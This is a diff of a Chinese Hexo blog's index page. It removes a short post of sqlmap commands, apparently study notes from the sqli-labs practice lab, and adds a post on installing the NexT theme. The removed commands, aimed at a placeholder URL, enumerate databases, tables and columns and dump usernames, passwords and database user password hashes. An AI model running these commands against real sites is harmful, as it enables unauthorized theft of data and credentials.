@@ -129,7 +129,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">62</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">61</span></a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -182,103 +182,6 @@
 
           <div class="content index posts-expand">
             
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/24/sqli-labs/sqlmap/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/cat.jpg">
-      <meta itemprop="name" content="WJW">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="WJW's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/11/24/sqli-labs/sqlmap/" class="post-title-link" itemprop="url">sqlmap</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2020-11-24 19:53:15" itemprop="dateCreated datePublished" datetime="2020-11-24T19:53:15+08:00">2020-11-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-05-23 09:29:40" itemprop="dateModified" datetime="2021-05-23T09:29:40+08:00">2021-05-23</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>564</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="1、爆全部库名"><a href="#1、爆全部库名" class="headerlink" title="1、爆全部库名"></a>1、爆全部库名</h4><pre><code>`sqlmap.py -u 地址 ?id=1 --dbs`  ***?id=1 不能漏，不然找不到，这里的--也可以是-，还有大小写也要注意一下。    
-</code></pre>
-<h4 id="2、爆指定库全部表名"><a href="#2、爆指定库全部表名" class="headerlink" title="2、爆指定库全部表名"></a>2、爆指定库全部表名</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -D securtiy -tables`
-</code></pre>
-<h4 id="3、爆指定表中的字段"><a href="#3、爆指定表中的字段" class="headerlink" title="3、爆指定表中的字段"></a>3、爆指定表中的字段</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -D security -T users -columns `
-</code></pre>
-<h4 id="4、-爆字段里面的内容"><a href="#4、-爆字段里面的内容" class="headerlink" title="4、 爆字段里面的内容"></a>4、 爆字段里面的内容</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -D security -T users -C id,password,username -dump`
-</code></pre>
-<h4 id="5、-爆数据库的所有用户"><a href="#5、-爆数据库的所有用户" class="headerlink" title="5、 爆数据库的所有用户"></a>5、 爆数据库的所有用户</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -users`
-</code></pre>
-<h4 id="6、-爆数据库用户的密码"><a href="#6、-爆数据库用户的密码" class="headerlink" title="6、 爆数据库用户的密码"></a>6、 爆数据库用户的密码</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -passwords`
-</code></pre>
-<h4 id="7、-获得当前网站数据库名称"><a href="#7、-获得当前网站数据库名称" class="headerlink" title="7、 获得当前网站数据库名称"></a>7、 获得当前网站数据库名称</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -current-db` 这里的-不能空格
-当前用户名同样。
-</code></pre>
-<h3 id="优化sqlmap"><a href="#优化sqlmap" class="headerlink" title="优化sqlmap"></a>优化sqlmap</h3><h4 id="设置持久连接"><a href="#设置持久连接" class="headerlink" title="设置持久连接"></a>设置持久连接</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -keep-alive --banner -v 5 `
-</code></pre>
-<h4 id="设置不接受http-body"><a href="#设置不接受http-body" class="headerlink" title="设置不接受http body"></a>设置不接受http body</h4><pre><code>`sqlmap.py -u 地址 ?id=1 --null connection`
-</code></pre>
-<h4 id="运行速度"><a href="#运行速度" class="headerlink" title="运行速度"></a>运行速度</h4><pre><code>`sqlmap.py -u 地址 ?id=1 --threads=3`
-</code></pre>
-<h4 id="一键优化"><a href="#一键优化" class="headerlink" title="一键优化"></a>一键优化</h4><pre><code>`sqlmap.py -u 地址 ?id=1 -o --banner -v 5`
-</code></pre>
-
-      
-    </div>
-
-    
-    
-    
-<div>
-  
-</div>
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
       
   
   
@@ -1185,6 +1088,86 @@ EOF;
   
   
 
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="WJW">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WJW's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/11/06/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/" class="post-title-link" itemprop="url">博客优化</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-11-06 21:06:11" itemprop="dateCreated datePublished" datetime="2020-11-06T21:06:11+08:00">2020-11-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-23 09:35:10" itemprop="dateModified" datetime="2021-05-23T09:35:10+08:00">2021-05-23</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>274</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="博客主题"><a href="#博客主题" class="headerlink" title="博客主题"></a>博客主题</h4><p>—第一步：git clone <a target="_blank" rel="noopener" href="https://github.com/theme-next/hexo-theme-next">https://github.com/theme-next/hexo-theme-next</a> themes/next 运行下载主题</p>
+<p>—第二步：打开设置站点的_config.yml(注意区分站点和主题文件位置)，找到theme，改成theme：next；</p>
+<h4 id="博客内容的编写"><a href="#博客内容的编写" class="headerlink" title="博客内容的编写"></a>博客内容的编写</h4><p>—-运行命令   hexo new page<br>       在source-_posts内找到page.md打开在记事本编辑即可</p>
+<h4 id="博客网站更名、语言、作者"><a href="#博客网站更名、语言、作者" class="headerlink" title="博客网站更名、语言、作者"></a>博客网站更名、语言、作者</h4><p>—-打开_config.yml 找到 title：xxx</p>
+<p>—-同样找到  language：zh-CN # 即可改为中文 </p>
+<p>—-author：xxx</p>
+
+      
+    </div>
+
+    
+    
+    
+<div>
+  
+</div>
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
 
   
   <nav class="pagination">
@@ -1256,7 +1239,7 @@ EOF;
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">62</span>
+          <span class="site-state-item-count">61</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
